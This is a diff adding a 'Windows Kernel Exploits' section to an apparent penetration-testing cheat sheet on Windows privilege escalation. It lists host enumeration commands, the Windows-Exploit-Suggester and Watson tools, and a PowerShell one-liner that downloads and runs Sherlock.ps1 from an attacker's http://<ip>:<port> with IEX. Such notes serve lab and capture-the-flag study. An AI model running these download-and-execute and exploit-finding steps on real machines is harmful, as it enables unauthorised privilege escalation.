@@ -58,3 +58,24 @@ Windows Privilege Escalation Methodology
 
 * reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 * reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+
+## Windows Kernel Exploits
+* systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Processor(s)" /C:"System Locale" /C:"Input Locale" /C:"Domain" /C:"Hotfix(s)"
+  * searchsploit 
+  * google
+
+* WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors
+
+* Windows-Exploit-Suggester
+  * python windows-exploit-suggester.py --database 2020-08-09-mssb.xls --systeminfo grandpa.txt
+
+* Serlock
+  * Config: Add to the last line the "Find-AllVulns"
+  * Download and run Sherlock:
+     * echo IEX(New-Object Net.WebClient).DownloadString('http://<ip>:<port>/Sherlock.ps1') | powershell -noprofile -
+
+* Watson
+  * Find .NET latest version of victim:
+     * dir %windir%\Microsoft.NET\Framework /AD     
+   * Fow older than windows 10 download zip version of watson v.1: https://github.com/rasta-mouse/Watson/tree/486ff207270e4f4cadc94ddebfce1121ae7b5437
+   * Build exe to visual studio
